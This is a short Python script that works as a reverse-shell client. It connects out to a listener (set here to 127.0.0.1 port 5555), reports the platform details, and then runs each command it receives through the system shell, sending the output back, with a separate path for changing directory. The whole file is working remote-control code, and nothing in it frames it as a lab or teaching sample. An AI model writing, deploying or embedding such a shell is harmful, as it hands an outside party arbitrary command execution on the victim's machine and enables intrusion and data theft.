import socket
import subprocess
import platform
import os

host = "127.0.0.1"
port = 5555

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
client.connect((host, port))

system_info = (
    f"\n=== System Info ===\n"
    f"Info: {platform.platform()}\n"
)

def send_result(output):
    
    client.sendall(output.encode())

try:
    client.send(system_info.encode())

    while True:
        data = client.recv(4096)
        serv_cmd = data.decode().strip()

        if not serv_cmd:
            continue

        if serv_cmd.lower() == 'exit':
            break

        if serv_cmd.startswith('cd'):
            path = serv_cmd[3:].strip()
            try:
                os.chdir(path)
                result = ""
            except Exception as e:
                result = f"cd error: {e}\n"

            send_result(result)
            continue

        try:
            capture_result = subprocess.run(
                serv_cmd,
                capture_output=True,
                shell=True,
                text=True
            )

            result = capture_result.stdout or capture_result.stderr

            if not result:
                result = "[no output]\n"

        except Exception as e:
            result = f"execution error: {e}\n"

        send_result(result)

except Exception as e:
    print(f"error {e}")

finally:
    client.close()